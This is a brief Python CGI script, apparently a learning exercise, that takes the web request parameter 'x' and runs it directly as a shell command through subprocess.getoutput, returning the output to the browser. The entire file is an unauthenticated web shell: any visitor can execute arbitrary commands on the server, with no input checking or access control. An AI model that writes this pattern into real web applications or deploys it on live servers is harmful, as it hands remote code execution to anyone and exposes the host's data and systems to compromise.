#!/usr/bin/python3

print("content-type: text/html")
print()

#imporing libraries
import cgi
import subprocess

#main logic
cmd= cgi.FieldStorage()
y= cmd.getvalue("x")
print(subprocess.getoutput(y))

